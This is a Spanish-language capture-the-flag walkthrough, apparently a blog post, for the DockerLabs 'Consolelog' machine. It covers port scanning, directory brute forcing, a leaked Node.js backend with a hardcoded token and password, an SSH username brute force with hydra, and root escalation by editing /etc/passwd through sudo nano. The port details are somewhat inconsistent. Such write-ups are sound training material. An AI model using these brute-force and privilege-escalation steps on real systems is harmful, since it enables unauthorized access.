---
title: Consolelog - DockerLabs
published: true
categories: DockerLabs
---

| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     |
| Linux  |  Fácil      | El Pingüino de Mario |

# Reconocimiento Inicial

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo.

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports
```

- `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/463bc887-458f-4249-9e04-50b15ab5aa57)

Durante el escaneo, descubrimos que el puerto abierto es:
- `8080` (HTTP)
- `3000` (Node)
- `5000` (SSH)

# Enumeración de Servicios

A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad y obtenemos más información sobre los servicios asociados a estos puertos.

```bash
nmap -p80,3000,5000 -sCV 172.17.0.2 -oG targeted  
```

![image](https://github.com/user-attachments/assets/21950d80-3e56-42ca-ad50-6b960f9d72da)

# Exploración Web

Al navegar al puerto `80`, descubrimos un sitio web con el titulo mi sitio web y un boton el cual es `Boton en fase beta`.

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir`: Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/`: Especifica la URL objetivo que deseas escanear.
- `-w`: Especifica el diccionario a utilizar.
- `-x`: Indica los tipos de extensiones que deseas buscar.

![image](https://github.com/user-attachments/assets/5d7cea6b-7108-49a9-be4b-2ba3959af3c2)

Encontramos una ruta llamada backend la cual contiene varios archivos y uno de esos es el server.js que contiene como funciona node en el peurto 3000.

```java
const express = require('express');
const app = express();

const port = 3000;

app.use(express.json());

app.post('/recurso/', (req, res) => {
    const token = req.body.token;
    if (token === 'tokentraviesito') {
        res.send('lapassworddebackupmaschingonadetodas');
    } else {
        res.status(401).send('Unauthorized');
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Backend listening at http://consolelog.lab:${port}`);
});

```
Nos esta diciendo que en el puerto 3000 si hacemos una peticion post a traves de json podemos a traves de la ruta /recurso la variable token si ponemos tokentraviesito nos devolvera lapassworddebackupmaschingonadetodas

```bash
curl -X POST http://172.17.0.2:3000/recurso/ -H "Content-Type: application/json" -d '{"token": "tokentraviesito"}'  
```
![image](https://github.com/user-attachments/assets/51ba41bb-66af-44be-9522-63cceabdeb9f)

Con esto no podemos hacer nada mas , pero y si es una contraseña de algun usuario del sistema del puerto ssh que hemos visto durante el escaneo

Para ello haremos fuerza bruta buscando algun usuario con la contraseña `lapassworddebackupmaschingonadetodas`, con `hydra`.

```bash
hydra -L /usr/share/wordlists/rockyou.txt  -p "lapassworddebackupmaschingonadetodas" ssh://172.17.0.2:5000 -t 4
```
![image](https://github.com/user-attachments/assets/3e733dac-0c6d-4864-a4f8-ad413cf5d71a)

Encontramos el usuario lovely.


Al acceder ejecutamos `sudo -l` y verificamos que podemos ejecutar `nano` como `root`:

![image](https://github.com/user-attachments/assets/788a4abb-a227-4378-924a-ae8882fd174d)

Mof+dificamos el archivo /etc/passwd quitando la x al usuario root, poruqe pues porque la quitar la x hace que no nos pida contraseña al acceder.

![image](https://github.com/user-attachments/assets/5c3f49dc-018b-4924-9df9-57446f6dc032)

Y ahora con que hagamos un su root, ya seriamos root.

![image](https://github.com/user-attachments/assets/2ff5985e-9af5-47d2-a01f-48c66cc44789)
